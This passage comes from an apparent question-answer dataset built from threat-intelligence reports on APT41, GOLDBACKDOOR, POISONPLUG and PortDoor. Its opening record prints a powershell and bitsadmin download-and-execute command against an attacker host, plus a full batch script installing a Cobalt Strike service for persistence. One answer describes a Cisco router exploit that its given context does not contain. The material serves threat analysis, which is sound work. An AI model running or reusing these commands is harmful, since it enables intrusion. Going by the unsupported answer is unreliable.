storesyncsvc.dll.\njava/lang/Runtime\ngetRuntime\n()Ljava/lang/Runtime;\nXcmd /c powershell $client = new-object\nSystem.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/install.bat','C:\\\nWindows\\Temp\\install.bat')&powershell $client = new-object\nSystem.Net.WebClient;$client.DownloadFile('http://66.42.98[.]220:12345/test/storesyncsvc.dll','\nC:\\Windows\\Temp\\storesyncsvc.dll')&C:\\Windows\\Temp\\install.bat\n'(Ljava/lang/String;)Ljava/lang/Process;\nStackMapTable\nysoserial/Pwner76328858520609\nLysoserial/Pwner76328858520609;\nFigure 6: Contents of logger.zip\nHere we see a toolmark from the tool (<https://github.com/frohoff/ysoserial>)ysoserial that was used to create the payload in the POC. The string Pwner76328858520609 is unique to the POC payload, indicating that APT41 likely used the POC as source material in their operation.\nIn the second variation, FireEye observed APT41 leverage the Microsoft BITSAdmin command-line tool to download install.bat (MD5: 7966c2c546b71e800397a67f942858d0) from known APT41 infrastructure 66.42.98[.]220 on port 12345.\nParent Process: C:\\ManageEngine\\DesktopCentral_Server\\jre\\bin\\java.exe\nProcess Arguments: cmd /c bitsadmin /transfer bbbb http://66.42.98[.]220:12345/test/install.bat C:\\Users\\Public\\install.bat\nFigure 7: Example FireEye Endpoint Security event depicting successful CVE-2020-10189 exploitation\nIn both variations, the install.bat batch file was used to install persistence for a trial-version of Cobalt Strike BEACON loader named storesyncsvc.dll (MD5: 5909983db4d9023e4098e56361c96a6f).\n@echo off\nset \"WORK_DIR=C:\\Windows\\System32\"\nset \"DLL_NAME=storesyncsvc.dll\"\nset \"SERVICE_NAME=StorSyncSvc\" set \"DISPLAY_NAME=Storage Sync Service\" set \"DESCRIPTION=The Storage Sync Service is the top-level resource for File Sync. It creates sync relationships with multiple storage accounts via multiple sync groups. If this service is stopped or disabled, applications will be unable to run collectly.\"  sc stop %SERVICE_NAME% sc delete %SERVICE_NAME%\nmkdir %WORK_DIR%\ncopy \"%~dp0%DLL_NAME%\" \"%WORK_DIR%\" /Y reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v \"%SERVICE_NAME%\" /t REG_MULTI_SZ /d \"%SERVICE_NAME%\" /f sc create \"%SERVICE_NAME%\" binPath= \"%SystemRoot%\\system32\\svchost.exe -k %SERVICE_NAME%\" type= share start= auto error= ignore DisplayName= \"%DISPLAY_NAME%\"\nSC failure \"%SERVICE_NAME%\" reset= 86400 actions= restart/60000/restart/60000/restart/60000\nsc description \"%SERVICE_NAME%\" \"%DESCRIPTION%\"\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\" /f reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICE_NAME%\\Parameters\" /v \"ServiceDll\" /t REG_EXPAND_SZ /d \"%WORK_DIR%\\%DLL_NAME%\" /f net start \"%SERVICE_NAME%\"\nFigure 8: Contents of install.bat\nStoresyncsvc.dll was a Cobalt Strike BEACON implant (trial-version) which connected to exchange.dumb1[.]com (with a DNS resolution of 74.82.201[.]8) using a jquery malleable command and control (C2) profile.\nGET /jquery-3.3.1.min.js HTTP/1.1\nHost: cdn.bootcss.com\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nReferer: http://cdn.bootcss.com/\nAccept-Encoding: gzip, deflate\nCookie: __cfduid=CdkIb8kXFOR_9Mn48DQwhIEuIEgn2VGDa_XZK_xAN47OjPNRMpJawYvnAhPJYM\nDA8y_rXEJQGZ6Xlkp_wCoqnImD-bj4DqdTNbj87Rl1kIvZbefE3nmNunlyMJZTrDZfu4EV6oxB8yKMJfLXydC5YF9OeZwqBSs3Tun12BVFWLI\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\nConnection: Keep-Alive Cache-Control: no-cache\nFigure 9: Example APT41 Cobalt Strike BEACON jquery malleable C2 profile HTTP request\nWithin a few hours of initial exploitation, APT41 used the storescyncsvc.dll BEACON backdoor to download a secondary (<https://www.fireeye.com/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html>)backdoor with a different C2 address that uses Microsoft CertUtil, a common TTP that we've observed APT41 use in past intrusions, which they then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c). The file 2.exe was a (<https://www.fireeye.com/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html>)VMProtected Meterpreter downloader used to download Cobalt Strike BEACON shellcode. The usage of VMProtected binaries is another very common TTP that we've observed this group leverage in multiple intrusions in order to delay analysis of other tools in their toolkit.\nGET /2.exe HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nAccept: */*\nUser-Agent: Microsoft-CryptoAPI/6.3\nHost: 91.208.184[.]78\nFigure 10: Example HTTP request downloading '2.exe' VMProtected Meterpreter downloader via CertUtil\nThe Meterpreter downloader 'TzGG' was configured to communicate with 91.208.184[.]78 over port 443 to download the shellcode (MD5: 659bd19b562059f3f0cc978e15624fd9) for Cobalt Strike BEACON (trial-version).\nFigure 12: Example HTTP request downloading 'TzGG' shellcode for Cobalt Strike BEACON\nThe downloaded BEACON shellcode connected to the same C2 server: 91.208.184[.]78. We believe this is an example of the actor attempting to diversify post-exploitation access to the compromised systems.\nManageEngine released a short term (<https://www.manageengine.com/products/desktop-central/remote-code-execution-vulnerability.html>)mitigation for CVE-2020-10189 on January 20, 2020, and subsequently released an (<https://www.manageengine.com/products/desktop-central/rce-vulnerability-cve-2020-10189.html?utm_source=rce-kb>)update on March 7, 2020, with a long term fix.\nAnswer this question: How did APT41 exploit the Cisco RV320 router, and what payload was delivered? Describe the process and the significance of the payload.",
    "output": "APT41 successfully exploited a Cisco RV320 router at a telecommunications organization on February 21, 2020, by leveraging a combination of two CVEs through a Metasploit module. This exploit enabled remote code execution on the router, allowing APT41 to download a 32-bit ELF binary payload named 'fuc' (MD5: 155e98e5ca8d662fad7dc84187340cbc), which was compiled for a 64-bit MIPS processor. The payload was downloaded using wget from the IP address 66.42.98.220. The significance of this payload is that it indicates a successful breach of the router's security, potentially allowing APT41 to gain further access to the network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Microsoft.\t (2007,\tDecember 10). A description of Svchost.exe\t in Windows XP Professional Edition. Retrieved\t September 07,\t 2011,\t from\t Microsoft\t Support: http://support.microsoft.com/?kbid=314056\nMicrosoft\t Corporation.\t (2011,\t September 07). Locales\tand Languages (Windows).\t Retrieved January 24, 2012, from Microsoft\t Software Development\t Network:\thttp://msdn.microsoft.com/en\u00adus/library/dd318716.aspx\nMicrosoft\t Corporation.\t (2011,\t September 07). OSVERSIONINFOEX structure.\t Retrieved\t January\t17, 2012, from\t Microsoft\t Software Development\t Network:\thttp://msdn.microsoft.com/en\u00adus/library/windows/desktop/ms724833(v=vs.85).aspx\nMicrosoft\t Corporation.\t (2011,\t September 07). SYSTEM_INFO structure.\t Retrieved\t January\t24,\t 2012,\t from\t Microsoft\t MSDN: http://msdn.microsoft.com/en\u00adus/library/windows/desktop/ms724958(v=vs.85).aspx\nMullaney,\tC.\t(2011, July\t30).\t Backdoor.Sogu Technical\t Details\t| Symantec.\t Retrieved\t August 18,\t 2011,\t from\t http://www.symantec.com/security_response/writeup.jsp?docid=2011\u00ad073003\u00ad5345\u00ad99&tabid=2\nParkour,\t M. (2011, July\t05). contagio: Jul 5\tCVE\u00ad2010\u00ad2883\tPDF invitation.pdf with Poison Ivy from 112.121.171.94 | pu.flower\u00adshow.org. Retrieved January 28, 2012, from\t Contagio:\t http://contagiodump.blogspot.com/2011/07/message\u00adtargeting\u00adexperts\u00adon\u00adJapan.html\nParkour,\t M. (2011, July\t14). Jul 13 CVE\u00ad2010\u00ad2883 PDF Meeting Agenda with more Poison Ivy\t www.adv138mail.com |\t 112.121.171.94. Retrieved\t September 22,\t 2011, from Contagiodump\t Blog: http://contagiodump.blogspot.com/2011/07/jul\u00ad13\u00adcve\u00ad2010\u00ad2883\u00adpdf\u00admeeting\u00adagenda.html\nRasmussen,\t R.\t (2011). Practical Usage of Passive\tDNS \tMonitoring for\t E\u00adCrime Investigations.\t Retrieved\t January 04, 2011,\tfrom http://conferences.npl.co.uk/satin/presentations/satin2011slide3\u00adRasmussen.pdf\nrbls.\t (2011, November 01).\t shenqi.travlman.com is not listed in any blacklists.\t Retrieved\t November 01,\t 2011,\t from\t rbls:\thttp://rbls.org/shenqi.travlman.com\nSafeZoneCast.\t (2011,\t August 09).\t SafeZoneCast. Retrieved\t December 30,\t 2011,\t from http://safezonecast.lgcns.com/Common/MenaceInfo/pop.MenaceInfo.jsp?code=SZ1108\u00ad0003NS\nSandbox,\t G. (2010, December 26). GFI Sandbox Malware Analysis Report: Trojan\u00adDownloader.Win32.Generic.\t Retrieved\t November 29,\t 2011,\tfrom\t GFI\t Sandbox: http://xml.ssdsandbox.net/view/3df0d0ab4ad9da4559a1c6464c8526d1\nshapeless.\t (n.d.).\t Poison Ivy 2.3.0\tDocumentation. Retrieved\t August 17, 2011,\t from\t Poison Ivy\t \u00adRemote Administration Tool:\thttp://www.poisonivy\u00adrat.com/dl.php?file=230docs\nSophos Ltd.\t (2011, November 25).\t Detailed Analysis \u00adTroj/Agent\u00adUDR \u00adViruses and Spyware \u00adThreat Analyses \u00adThreat Center \u00adSophos. Retrieved\t December 8, 2011,\tfrom\t Sophos:\thttp://www.sophos.com/en\u00adus/threat\u00adcenter/threat\u00adanalyses/viruses\u00adand\u00adspyware/Troj~Agent\u00adUDR/detailed\u00adanalysis.aspx\nSophos Ltd.\t (2012, January\t19). Detailed Analysis \u00adTroj/Bdoor\u00adBDM \u00adViruses and Spyware \u00adThreat Analyses \u00adThreat Center \u00adSophos. Retrieved\t January\t31,\t 2012,\t from Sophos Threat\t Center: http://www.sophos.com/en\u00adus/threat\u00adcenter/threat\u00adanalyses/viruses\u00adand\u00adspyware/Troj~BDoor\u00adBDM/detailed\u00adanalysis.aspx\nSunbelt. (2009, October 15). Sunbelt CWSandbox Malware Analysis Report: Backdoor.Win32.Pasur. Retrieved\t December 19,\t 2011, from\t Sunbelt Security Sandbox:\t http://xml.ssdsandbox.net/archive/42e8163b7f08dd383e62e4bdb7f07c08\nSunbelt\t Security.\t (2009,\t May 03).\t Sunbelt CWSandbox Malware Analysis Report. Retrieved\t December 01, 2011, from Sunbelt Security\tSandbox:\t http://xml.ssdsandbox.net/archive/70a88091e1f9a7bee246488cce79936a\nSunbelt\t Security.\t (2009,\t October 16).\t Sunbelt CWSandbox Malware Analysis Report: Trojan.Win32.Sisproc.\t Retrieved\t December 19,\t 2011,\t from\t Sunbelt Security\t Sandbox: http://xml.ssdsandbox.net/archive/3fdea18b9610cbc9b63ba7a44899fbfb\nSunbelt\t Security.\t (2010,\t December 31). CWSandbox Report by MD5 \tat Sunbelt Security. Retrieved October 25,\t 2011,\tfrom Sunbelt Security: http://www.sunbeltsecurity.com/partnerresources/cwsandbox/md5.aspx?id=69ed8f7b0046956045a90 e36e3c83f6a\nSunbelt\t Security.\t (2010,\t May 12).\t GFI SandBox Analysis Report.\t Retrieved February\t 07,\t 2012, from\t Sunbelt Security\tSandBox: http://xml.ssdsandbox/archive/5bc597e48270f04ec9b683432432e352\nSunbelt Security.\t(2011,\t June 01). GFI SandBox Malware Analysis Report/ Trojan.Win32.Generic!SB.\t Retrieved January\t23,\t 2012,\t from GFI\tSandBox: http://xml.ssdsandbox.net/view/228191d05a09877f90c8b802617bb25f\nSymantec Corporation. (2010,\t March\t11).\t Backdoor.Sykipot At Work.\t Retrieved February\t02, 2012,\t from\t Symantec Connect Community: \thttp://www.symantec.com/connect/blogs/backdoorsykipot\u00adwork\nSymantec Corporation. (2012,\t January\t26).\t Insight into Sykipot Operations | Symantec Connect Community. Retrieved\t February 05, 2012,\t from\t Symantec Connect\t Community:\t http://www.symantec.com/connect/blogs/insight\u00adsykipot\u00adoperations\u00ad0\nTelus.\t (2011, August 03).\t Backdoor.Win32.Murcy.A \u00adTELUS\tSecurity\t Labs.\t Retrieved\t December 06, 2011,\t from\t TELUS\tSecurity Labs: \thttp://telussecuritylabs.com/threats/show/TSL20110803\u00ad01\nThakur,\t V.\t (2011,\tDecember 14).\t The\tSykipot Attacks\t | Symantec \tConnect Community. Retrieved\t February\t04, 2012,\t from Symantec Connect Community:\thttp://www.symantec.com/connect/blogs/sykipot\u00adattacks\nThreat Expert\t Ltd. (2010,\t June 15).\t ThreatExpert Report.\t Retrieved\t January 11,\t2012,\t from ThreatExpert: http://www.threatexpert.com/report.aspx?md5=b098aee16bd138c412075C9d315aefc9\nThreat Expert\t Ltd. (2011,\t July 26).\t ThreatExpert Report: Backdoor.Win32.Agent.anvj, Trojan\u00adDownloader.Delphi.\t Retrieved\t December 17,\t 2011,\t from\t ThreatExpert:\t http://www.threatexpert.com/report.aspx?md5=3e3736dffedaf2a0ae4d948567933b3f\nThreat Expert\t Ltd. (2011,\tNovember 04). ThreatExpert report: Mal/Behav\u00ad027, Backdoor:Win32/Idicaf.gen!B.\t Retrieved\t November 25,\t 2011, \tfrom\t ThreatExpert:\t http://www.threatexpert.com/report.aspx?md5=229947cc71a4601b8b7794b402e536a9\nThreat Expert\t Ltd. (2011,\t October 06).\t ThreatExpert Report: Mal/Behav\u00ad027, Virus/Win32.Atraps.CK.\t Retrieved November 21, 2011, from\t ThreatExpert: http://www.threatexpert.com/report.aspx?md5=da2f98315f4c56fce21273e21e453b76\nThreat Expert\t Ltd. (2011,\t September 25). ThreatExpert Report: TrojanDropper: Win32/Idicaf.C, Virus.Win32.Atraps.CK, Backdoor.Win32.Agent.bhxn.\t Retrieved\t December 25,\t 2011, from ThreatExpert: http://www.threatexpert.com/report.aspx?md5=f4c08d3df5ede0790e34eae0c5db8a7a\nThreat Expert\t Ltd. (2008,\t December 18).\t ThreatExpert Report: Mal/EncPk\u00adBL, Worm:Win32/Emerleox.J, Packed.Win32.Klone.af.\t Retrieved January\t15,\t 2012, from ThreatExpert: http://www.threatexpert.com/report.aspx?md5=37037f674bcbbb7eef3889ab6eb30268\nThreatExpert Ltd.\t (2010,\t March\t18). ThreatExpert Report: Troj/Agent\u00adMSC, BinImage/Agent.283805.\t Retrieved January\t26,\t 2012,\t from ThreatExpert:\t http://www.threatexpert.com/report.aspx?md5=2d8a9038e151fb30d45ea8668afd2a8e\nThreatExpert Ltd.\t (2011,\t December 09).\t ThreatExpert Report: Backdoor.Win32.Delf.abow, Trojan.Win32.CDur, Mal/Behav\u00ad058.. Retrieved February\t03,\t 2012,\t from ThreatExpert:\t http://www.threatexpert.com/report.aspx?md5=f0b848a841d4ef3406a6f9c4766c540b\nUS\u00adCERT.\t (2011,\t March\t 26).\t Early Warning and Indicator\t Notice\t(EWIN)\u00ad11\u00ad077\u00ad01A UPDATE.\t Retrieved\t January\t 06,\t 2011, from\t Incident Prevention and\t Detection:\t Protecting Information Security\t of\t National Banks:\t http://www.occ.treas.gov/news\u00adissuances/alerts/2011/alert\u00ad2011\u00ad4b.pdf\nVerisign. (2011).\t Verisign Authentication Services.\t Retrieved\t December 29, 2011, from Verisign Class 3\tCode Signing\t Certificate Revocation List: http://crl.verisign.com/CSC3\u00ad2009.crl\nWard, E.\t (2011, July\t 31).\t Backdoor.Murcy |\t Symantec.\t Retrieved January 05, 2011, from\t Symantec: http://www.symantec.com/security_response/writeup.jsp?docid=2011\u00ad080105\u00ad2030\u00ad99\nWikipedia.\t (n.d.).\t List of Intel microprocessors. Retrieved\t January\t21,\t 2012, from\t Wikipedia,\t the free encyclopedia: http://en.wikipedia.org/wiki/List_of_Intel_microprocessors\nWong,\t J.\t (2011,\t August 16).\t Encyclopedia entry:Backdoor.Win32/Thoper.A.\t Retrieved January\t24, 2012,\t from Microsoft\t Malware Protection Center: http://www.microsoft.com/security/portal/Threat/Encyclopedia/Entry.aspx?Name=Backdoor%3AWin 32%2FThoper.A\nXTiger \u00adCrackersoftware. (2011,\tFebruary\t14).\t All for\tDream... Retrieved December 23,\t 2011, from\t xdoors.net: http://www.xdoors.net/faq/index.html\nXTiger.\t (2010, April 28).\t forum.xdoors.net. Retrieved December 19, 2011, from\t xdoors.net: http://forum.xdoors.net/viewtopic.php?f=4&t=7\nXTiger.\t (2011, March 16). forum.xdoors.net. Topic: X\u00adDoor/X\u00adShell free download paused.\t Retrieved December 27, 2011,\tfrom forum.xdoors.net:\thttp://forum.xdoors.net/viewtopic.php?f=5&t=76\nXTiger.\t (2011). Xdoors.net.\t Retrieved December 23, 2011,\t from\t All for dream...:\thttp://www.xdoors.net\nXTiger.\t (n.d.).\t X\u00adShell.\t Retrieved\t December 23, 2011, from\t XDoors: http://www.xdoors.net/help/X\u00adShell.htm\n\nBased on the above text, answer a question. How did the malware used in the SK Communications hack locate its command and control (C2) servers, and why was this method effective?",
    "output": "The malware used in the SK Communications hack located its C2 servers by resolving callback domains into IP addresses using the Domain Name System (DNS) protocol. This method was effective because DNS is a ubiquitous and essential protocol for internet communication, making it difficult to block without disrupting legitimate traffic. By using DNS, the malware could dynamically locate its C2 servers even if their IP addresses changed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Dalbit APT group use Reconnaissance techniques to gather information about their targets?",
    "output": "Reconnaissance is a crucial phase in the adversary lifecycle where attackers gather information about their targets to plan future operations. In the case of the Dalbit APT group, they employ various Reconnaissance techniques to collect valuable information about their targets. According to the analysis, the group uses tools such as Fscan, NBTScan, TCP Scan, and Goon to perform network scans and gather information about the target's infrastructure. Additionally, they use tools like Dumpert and Procdump to steal credentials and sensitive information. Furthermore, the group uses a custom-made email extraction tool to extract emails from the target's Exchange server. They also use a tool to take screenshots of the infected PC and send them to their server. All these techniques demonstrate the group's efforts to gather as much information as possible about their targets, which can be used to plan and execute further attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: June 2018\nIn June 2018, a utility used to update ASUS computers was compromised in an operation dubbed (<https://securelist.com/operation-shadowhammer-a-high-profile-supply-chain-attack/90380/>)\"ShadowHammer\" by Kaspersky. Open-source reporting (<https://www.kaspersky.com/blog/shadow-hammer-teaser/26149/>)indicated that more than 50,000 systems installed the malicious update, yet the malware was only designed to execute and retrieve second-stage malware on a designated list of approximately 600 systems, demonstrating this was a targeted campaign. (<https://www.zdnet.com/article/researchers-publish-list-of-mac-addresses-targeted-in-asus-hack/>)Public reporting on the incident noted that many of the targeted MAC addresses were associated with wireless adapters from various vendors, partially indicating the operation's targeting strategy.\n\u2022 Although we have limited visibility into the intended targets of this operation, we observed one of the whitelisted MAC addresses on a system at a telecom company.\n\u2022 Kaspersky's analysis of the infected machines revealed that a POISONPLUG backdoor was installed as a result of the malicious update. While we have been unable to attribute the DAYJOB malware used in the incident to APT41 due to an inability to independently confirm this\nsequence of events, we confirm the reported stage-two POISONPLUG backdoor is attributed to APT41, contained several gaming references, and was likely used to target the gaming industry.\n\u2022 The POISONPLUG sample (MD5: 37e100dd8b2ad8b301b130c2bca3f1ea) attempts to connect to a Google document that was created under the same name and email address (Tom Giardino and ) that was used to target the cryptocurrency organization. It also attempts to connect to a Steam community page (Table 5).\n\u2022 The POISONPLUG payload uses DDR and parses the Google document for a C&C command. The Steam community page is likely used as a fallback mechanism.\n\u2022 FireEye malware analysis of the POISONPLUG sample indicates the malware is likely designed to run only one system with a C: drive volume serial number of 0xc25cff4c.\n\u2022 Additional POISONPLUG samples located in Table 6 also leverage Google Document and Steam Community Pages for C&C.\nTable 5. \"ShadowHammer\" stage-two POISONPLUG sample.\nMedium Headline: July 2018\nBeginning in July 2018, APT41 appeared to have directly targeted several East and Southeast Asia-based video game developers and distributors to inject legitimate executables with the CRACKSHOT backdoor.\n\u2022 Like other high-profile supply chain compromises attributed to APT41, these incidents included the incorporation of malicious code into legitimate executables and the signing of these files using legitimate digital certificates from the same compromised organization.\n\u2022 APT41 used a C&C domain that masquerades as Xigncode, , in the compromise of the video game PointBlank. Ironically, Xigncode is a service intended to prevent hacking and cheating in online games.\n\u2022 We attribute these compromises (also reported by both (<https://www.welivesecurity.com/2019/03/11/gaming-industry-scope-attackers-asia/>)ESET and (<https://securelist.com/operation-shadowhammer-a-high-profile-supply-chain-attack/90380/>)Kaspersky) to APT41 based on the unique use of the CRACKSHOT backdoor and tactics consistent with APT41 operations. A list of related indicators is in Table 7.\nBig Headline: Overlaps Between Espionage and Financial Operations\nIdentified overlaps across various incidents attributed to APT41 demonstrate the group's dual nature. Figure 9 and Figure 10 illustrate crossover between espionage and financially motivated activity, as well as technical similarities in tools used across both types of operations.\n\u2022 The email address  was used to send spear-phishing emails to a Taiwanese newspaper with the subject lure \"I have a little surprise for you :)\" in an espionage campaign in August 2016 (Figure 9).\n\u2022 The same email address was later used to target a cryptocurrency exchange in June 2018, demonstrating email reuse between espionage operations and financially motivated activity.\n\u2013 The lure used to target the cryptocurrency exchange (displayed in Figure 5 and translated in Figure 6) referenced an online gaming platform, tying the cryptocurrency targeting to APT41's focus on video game-related targeting.\n\u2013 As depicted in Figure 10, hrsimon59@gmail. com was used to create a Google document being used as a POISONPLUG (MD5: 37e100dd8b2ad8b301b130c2bca3f1ea) C&C. As previously mentioned, this sample also connected to a Steam page.\nEmail overlaps between espionage and financial activity.\nMalware overlaps across supply chain compromises.\nMedium Headline: ASUS SUPPLY CHAIN (AKA \"SHADOWHAMMER\")\nJUNE\u2013NOV 2018\nDAYJOB\nTrojanized ASUS Update Utility 0f49621b06f2cdaac8850c6e9581a594\nVideo Game Related\nGoogle Document Author\n\u2022 FireEye malware analysis identified source code overlaps between malware used by APT41 in May 2016 targeting of a U.S.-based game development studio and the malware observed in supply chain compromises in 2017 and 2018.\n\u2013 In May 2016, APT41 deployed a POISONPLUG sample at a U.S.-based game development studio. The stage-one loader for this sample (MD5: 830a09ff05eac9a5f42897ba5176a36a) shares code overlaps with the stage-one shellcode loader (MD5: a6c7db170bc7a4ee2cdb192247b59cd6) used in the Netsarang compromise, first reported by Kaspersky as ShadowPad. These connections, illustrated in Figure 10, led us to identify the malware used in the Netsarang incident as a variant of POISONPLUG (therefore: POISONPLUG.SHADOW).\n\u2013 The POISONPLUG and POISONPLUG.SHADOW variants share the observed commonalities:\n\u25aa The entrypoint functions for both loaders use the same instructions, constants, and structures to pass control to loading routines.\n\u25aa The layout of functions and data within the loaders are the same; for example, following the entrypoint, both loaders contain an unusual region of structured data 0x60 bytes long.\n\u25aa Both loaders use the same API hashing algorithm to resolve routines from system libraries (Figure 11 and Figure 12). The routine uses byte-wise operations to compute a hash, including byte-wise rotate-right by eight bits, byte-wise binary, OR with 0x20, and byte-wise XOR using the four-byte key 0x7C35D9A3. Using this routine, the hash for kernel32.dll, a common DLL provided by Microsoft Windows, is 0xFD5B1261.\n\u2022 FireEye analysis of a separate POISONPLUG payload (MD5: c8403fabda4d036a55d0353520e765c9) compiled in July 2017 and the POISONPLUG. SHADOW stage-two shellcode loader (MD5: 72584d6b7dd10c82d9118567b548b2b1) identified multiple additional plug-in similarities.\n\u2013 Core plug-in IDs between the samples are the same, including 100, 101, 102, 103, 104, and 201.\n\u2013 Core plug-in names are the same including Plugins, Online, Config, Install, and HTTP.\n\u2013 C&C plug-in IDs and names between both samples are the same, including 200/TCP, 201/HTTP, 202/UDP, 203/DNS, 204/HTTPS, and 205/SSL.\n\u2013 Both samples parse the C&C response by searching for \"$\" characters and decoding the result.\nQuestion: What tactics did APT41 employ in the July 2018 supply chain compromises targeting video game developers and distributors, and how did they utilize legitimate services to mask their activities?",
    "output": "Answer: In July 2018, APT41 directly targeted several East and Southeast Asia-based video game developers and distributors to inject legitimate executables with the CRACKSHOT backdoor. This involved incorporating malicious code into legitimate executables and signing these files using legitimate digital certificates from the compromised organizations. APT41 used a C&C domain that masqueraded as Xigncode, a service intended to prevent hacking and cheating in online games, in the compromise of the video game PointBlank. This tactic allowed APT41 to blend in with legitimate traffic and avoid detection. The attribution of these compromises to APT41 was based on the unique use of the CRACKSHOT backdoor and tactics consistent with previous APT41 operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: GOLDBACKDOOR\nThe identified copy of GOLDBACKDOOR is a Windows Portable Executable DPEE file with a build timestamp of 9 February 2022 02\u202238\u202230 UTC and contains a Program Database DPDBE path reference to D:\\Development\\GOLD-BACKDOOR\\Release\\FirstBackdoor.pdb, from which was named.\nIn contrast with the timestamps of files in the ZIP file, which were added within hours of being sent to targets, this executable was created over a month prior, potentially indicating the final payload is not customized on a per-target basis. While it is unclear from this sample alone if individual operators have the ability to generate on-demand unique copies of GOLDBACKDOOR, these types of time deltas can sometimes be reflective of actor groups composed of separated operational and development teams.\n1 https://docs.microsoft.com/en-us/windows/win32/debug/pe-format\nDuring Stairwell's analysis of this malware, the identified PDB path in GOLDBACKDOOR led to the initial linking of this malware to a copy of BLUELIGHT, reported by Volexity2 in August 2021, containing a PDB path of E:\\Development\\BACKDOOR\\ncov\\Release\\bluelight.pdb. Based on corresponding build paths, it's likely both malware families were created by a common development resource.\nGOLDBACKDOOR utilizes cloud service providers for receiving actor commands and exfiltrating data. The sample analyzed as part of this investigation used Microsoft OneDrive and Graph APIs, while an additional identified sample DSHA256 hash:\n485246b411ef5ea9e903397a5490d106946a8323aaf79e6041bdf94763a0c028) used Google Drive. Embedded in the analyzed copy of GOLDBACKDOOR are a set of API keys used to authenticate against Azure and retrieve commands for execution. Received commands are prefixed with a single-character value, which denotes the corresponding task requested of the malware.\nGOLDBACKDOOR provides attackers with basic remote command execution, file downloading/uploading, keylogging, and the ability to remotely uninstall. This functionality and implementation closely match BLUELIGHT; however, the increased focus appears to have been placed on file collection and keylogging. A list of file extensions checked for by this malware are listed below:\njpg, doc, xls, ppt, hwp, url, csv, pdf, show, cell, eml, odt, rft, nxl, amr, 3gp, m4a, txt, msg, key, der, cer, docx, xlsx, pptx, pfx, mp3, inf, jog, bin\nBig Headline: Tracking document\nWhile analyzing the deployment chain of GOLDBACKDOOR, NK News provided a second file DSHA256 hash: c5369c2ce7f33d6cd209cd61226a0637adc809b864deb73a98d78bfed0883163) that was sent by the attackers and initially staged on Microsoft OneDrive. Contained in this ZIP file was a single Microsoft Word document named Kang Min-chol Edits 2.doc DSHA256 hash: 18c9fd4f781789cd15cee4fcb18fa983897fc9876422d662a2243ff7499f5948), consistent with the file names from the initial phishing attempt.\nThe content of this document matches that of the decoy document deployed by the LNK file in the previous phishing attempt, with one critical addition. Embedded in the document is a reference to an external image hosted on the cloud application platform Heroku. When viewed in Microsoft Word, if this link returns an image, it will be presented as part of the document; otherwise, it may go unnoticed by a user. When the document is viewed using the GNU strings tool, the embedded link is easily seen:\n2 https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/\n\nWhat role do cloud service providers play in the operation of GOLDBACKDOOR, and how does the use of different services impact the malware's capabilities and detection avoidance? Provide examples of the services used and their functions.",
    "output": "Cloud service providers play a crucial role in GOLDBACKDOOR's operation by facilitating command and control (C&C) communication and data exfiltration. The malware uses Microsoft OneDrive and Graph APIs, as well as Google Drive, for receiving actor commands and exfiltrating data. For instance, the analyzed sample of GOLDBACKDOOR used Microsoft OneDrive and Graph APIs, while another sample used Google Drive. By leveraging legitimate cloud services, the malware can blend in with normal network traffic, making it harder to detect. This approach enhances the malware's stealth capabilities and allows it to perform tasks such as remote command execution, file downloading/uploading, keylogging, and remote uninstallation without raising suspicion.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key capabilities of the PortDoor backdoor, and how do these capabilities enhance the threat actor's ability to maintain persistence and evade detection?",
    "output": "The PortDoor backdoor has multiple functionalities, including reconnaissance, target profiling, delivery of additional payloads, privilege escalation, process manipulation, static detection antivirus evasion, one-byte XOR encryption, AES-encrypted data exfiltration, and more. These capabilities enhance the threat actor's ability to maintain persistence by allowing them to gather information about the victim's machine, communicate with the C2 server, and escalate privileges. The use of encryption and dynamic API resolving helps the backdoor evade static detection methods, making it harder for traditional antivirus solutions to identify and remove the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: C:\\WINDOWS\\fatjse.exe\nThe Image Path of the newly-copied file is then used to add a new service to the ControlSet Registry Key. This will ensure persistence on the infected machine. The name of the new service (GHIJKL NOPQRSTU WXY) might be suspicious to administrators.\nExample:\nRegKey Name: MACHINE\\SYSTEM\\CONTROLSET001\\SERVICES\\GHIJKL NOPQRSTU WXY\nRegKey Data: C:\\WINDOWS\\fatjse.exes\\\\0\nThe malware performs a DNS request to vps.xxxxx.net for resolution of its controller.  The infected machine connects to the controller over TCP port 81 with the following initial connection string (Figure 13).\nTwo strings of interest are revealed upon examination of the process in memory.\n%c%c%c%c%c%c.exe\nGET %s HTTP/1.1Content-Type: text/htmlHost: %sAccept: text/html, */*User-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)\nSearch engine results for the last part of the UA string MyIE 3.01 show the exact UA string mentioned in a blog post by FireEye in 201017. The FireEye blog references another blog by researchers from Arbor Networks18. The latter blog describes in more\ndepth the malware behavior, which shares several elements with the sample under investigation, including the use of a raw TCP connection to the server, the UA string in memory, and the pattern to generate the executable name.\n10 https://whois.domaintools.com/211.153.xx.x\n11 https://www.virustotal.com/en/ip-address/211.153.xx.x/information/\n12 https://www.virustotal.com/en/ip-address/211.153.xx.x/information/\n13 https://www.virustotal.com/en/ip-address/211.153.xx.x/information/\n14 https://www.virustotal.com/en/ip-address/211.153.xx.2xx/information/\n15 